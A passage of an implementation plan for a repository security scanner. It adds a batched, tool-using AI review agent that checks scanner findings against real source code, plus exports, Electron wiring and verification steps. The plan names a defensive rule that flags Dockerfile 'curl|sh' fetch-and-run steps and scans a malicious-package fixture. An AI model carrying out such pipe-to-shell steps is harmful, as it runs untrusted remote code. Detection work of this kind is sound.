      buildBatchPrompt(report, batch, config, ctx),
      tools,
      ctx,
      { maxRounds, maxTokensPerReview: budgetPerBatch },
      fetchImpl
    );

    if (loopResult.result) {
      summaries.push(loopResult.result.summary);
      notes.push(...loopResult.result.notes);
    } else if (loopResult.raw) {
      rawTexts.push(loopResult.raw);
    }
  }

  const fallback = createOfflineAiReviewPlaceholder(report, config);
  const summary =
    summaries.length > 0 ? summaries.join("\n\n") : rawTexts.filter(Boolean).join("\n\n") || fallback.summary;

  return {
    providerType: config.type,
    model: config.model,
    generatedAt: new Date().toISOString(),
    summary,
    findingNotes: notes.length > 0 ? mergeNotes(fallback.findingNotes, notes) : fallback.findingNotes
  };
}

function uniqueFiles(findings: Finding[]): string[] {
  return Array.from(new Set(findings.map((finding) => finding.filePath)));
}

function groupFindings(findings: Finding[], maxPerBatch: number): Finding[][] {
  if (findings.length === 0) {
    return [];
  }

  const byCategory = new Map<string, Finding[]>();
  for (const finding of findings) {
    const list = byCategory.get(finding.category) ?? [];
    list.push(finding);
    byCategory.set(finding.category, list);
  }

  const ordered = Array.from(byCategory.entries()).sort(
    (a, b) => (riskOrder[a[1][0].riskLevel] ?? 99) - (riskOrder[b[1][0].riskLevel] ?? 99)
  );

  const batches: Finding[][] = [];
  for (const [, list] of ordered) {
    for (let i = 0; i < list.length; i += maxPerBatch) {
      batches.push(list.slice(i, i + maxPerBatch));
    }
  }
  return batches;
}

function mergeNotes(
  fallback: AiReviewResult["findingNotes"],
  agentNotes: AgentNote[]
): AiReviewResult["findingNotes"] {
  const agentById = new Map(agentNotes.map((note) => [note.findingId, note]));
  return fallback.map((note) => {
    const agent = agentById.get(note.findingId);
    if (!agent) {
      return note;
    }
    return {
      findingId: note.findingId,
      explanation: agent.explanation,
      falsePositiveNote: agent.falsePositiveNote,
      saferPattern: agent.saferPattern ?? note.saferPattern
    };
  });
}

function buildSystemPrompt(config: AiProviderConfig): string {
  const toolGuidance =
    config.dataSharingMode === "metadata-only"
      ? "No tools are available. Respond with a final JSON object based only on the metadata provided."
      : "Read files and search code before concluding. Verify each finding against real code.";
  return [
    "You are a security audit review agent.",
    toolGuidance,
    "Respond ONLY with a single JSON object matching the requested schema."
  ].join("\n");
}

function buildBatchPrompt(
  report: AuditReport,
  batch: Finding[],
  config: AiProviderConfig,
  ctx: ReviewToolContext
): string {
  const langInstruction: Record<string, string> = {
    en: "You MUST respond in English.",
    "zh-TW": "你必須使用繁體中文回覆。",
    "zh-CN": "你必须使用简体中文回复。"
  };
  const lang = config.language ?? "zh-TW";
  const findingsJson = JSON.stringify(batch.map((finding) => serializeFindingForPrompt(finding, config)), null, 2);
  const fileHint =
    ctx.allowedFiles && ctx.allowedFiles.length > 0
      ? `\nFiles you may read: ${ctx.allowedFiles.join(", ")}`
      : "";

  const prompt = [
    "You are investigating deterministic security scanner findings.",
    "Use tools to read the actual source code and verify each finding before writing notes.",
    "For each finding decide: real risk, likelihood of a false positive, and a safer pattern.",
    `There are ${batch.length} finding(s) to review in this batch.`,
    langInstruction[lang] ?? langInstruction["zh-TW"],
    "",
    "FINDINGS:",
    findingsJson,
    fileHint
  ].join("\n");

  return config.redactionEnabled ? redactSecrets(prompt) : prompt;
}
```

`serializeFindingForPrompt` already exists in this file — reuse it. Ensure imports at the top now include `Finding` from `@repo-auditor/scanner-core`, `FetchLike` from `./providers.js`, and the new modules.

- [ ] **Step 4: Run tests to verify they pass**

Run: `npx vitest run packages/ai-review/tests/review.test.ts`
Expected: PASS (existing 4 tests + 2 new).

- [ ] **Step 5: Typecheck**

Run: `npm run typecheck -w @repo-auditor/ai-review`
Expected: no errors.

- [ ] **Step 6: Commit**

```bash
git add packages/ai-review/src/review.ts packages/ai-review/tests/review.test.ts
git commit -m "feat: batched tool-using AI review agent"
```

---

## Task 12: Export agent and tools modules

**Files:**
- Modify: `packages/ai-review/src/index.ts`

- [ ] **Step 1: Update exports**

Edit `packages/ai-review/src/index.ts`:

```ts
export { buildProviderRequest, listProviderModels, requestProviderCompletion } from "./providers.js";
export type { FetchLike, ProviderModel, ProviderRequest } from "./providers.js";
export { buildAiReviewPrompt, createOfflineAiReviewPlaceholder, previewProviderRequest, runAiReview } from "./review.js";
export { buildTools } from "./tools.js";
export type { ReviewToolContext, ToolDefinition, ToolMode } from "./tools.js";
export { buildAgentPrompt, estimateTokens, parseAgentResponse, runAgentLoop } from "./agent.js";
export type { AgentFinalResult, AgentLoopOptions, AgentLoopResult, AgentNote } from "./agent.js";
export { redactSecrets } from "./redaction.js";
export type { AiDataSharingMode, AiProviderConfig, AiProviderType, AiReviewOptions, AiReviewResult } from "./types.js";
```

- [ ] **Step 2: Typecheck + test**

Run: `npm run typecheck -w @repo-auditor/ai-review && npx vitest run packages/ai-review`
Expected: PASS.

- [ ] **Step 3: Commit**

```bash
git add packages/ai-review/src/index.ts
git commit -m "chore: export agent and tools modules"
```

---

## Task 13: Pass scanPath through Electron

**Files:**
- Modify: `apps/electron/src/main.ts:196-198`
- Modify: `apps/electron/tests/ipc.test.ts`

- [ ] **Step 1: Write the failing test**

Append to `apps/electron/tests/ipc.test.ts` inside the existing `describe("main window lifecycle", ...)` block:

```ts
  it("passes the resolved target path to the AI review agent", () => {
    const source = fs.readFileSync(path.join(__dirname, "../src/main.ts"), "utf8");

    expect(source).toContain('runAiReview(payload.report, provider, { scanPath: payload.report.target.localPath ?? undefined })');
  });
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run apps/electron/tests/ipc.test.ts`
Expected: FAIL — the exact string is absent.

- [ ] **Step 3: Implement**

Edit `apps/electron/src/main.ts` lines 196-198:

```ts
  return payload.execute
    ? runAiReview(payload.report, provider, { scanPath: payload.report.target.localPath ?? undefined })
    : createOfflineAiReviewPlaceholder(payload.report, provider);
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run apps/electron/tests/ipc.test.ts`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add apps/electron/src/main.ts apps/electron/tests/ipc.test.ts
git commit -m "feat: pass scan path to AI review agent in electron"
```

---

## Task 14: Full verification

**Files:** none (verification only)

- [ ] **Step 1: Build all workspaces**

Run: `npm run build`
Expected: succeeds for scanner-core, ai-review, cli.

- [ ] **Step 2: Run full test suite**

Run: `npm test`
Expected: build + `vitest run` + typecheck all pass (13 existing test files + new ones).

- [ ] **Step 3: Manual smoke test of language-aware rules**

Run: `npm run dev:cli -- scan fixtures/malicious-package --offline --format json`
Expected: exit code 0 (non-blocking) or 2 (blocking), JSON report includes `coverage` object and `dangerousCalls`-derived findings (fixture has no py/go/java, so coverage.byLanguage may be empty — verify `totalFiles` > 0).

- [ ] **Step 4: Update validation docs**

Append a short section to `docs/validation/opencode-telegram-bot.md` summarizing the new language-aware detection and the AI agent (if that doc describes the earlier GitHub-vs-npm gap, add a note that Track 1 rules now detect language-specific calls).

- [ ] **Step 5: Commit**

```bash
git add docs/validation/opencode-telegram-bot.md
git commit -m "docs: note language-aware rules and AI agent capabilities"
```

---

## Self-Review Notes

- **Spec coverage:** Track 1 (fileWalker ext → Task 1, pathPattern → Task 2, language patterns + collectors → Task 3, rules → Task 4, coverage → Task 5-6, exports → Task 7). Track 2 (tools → Task 9, agent loop → Task 10, batching/orchestration → Task 11, options/types → Task 8, exports → Task 12, electron → Task 13). All spec sections mapped.
- **No new dependencies:** glob matcher replaces micromatch; tools reuse `listScannableFiles`/`matchesGlob` from scanner-core.
- **Backward compatibility:** `runAiReview` keeps its signature order `(report, config, options?, fetchImpl?)`; existing review.test.ts tests pass because non-JSON provider responses fall back to raw text summary + placeholder notes.
- **Duplicate-finding note:** language rules may overlap generic rules (e.g., Dockerfile `curl|sh` hits both `command-execution` and `dockerfile-run-pipe`). Dedup is explicitly out of scope per spec.
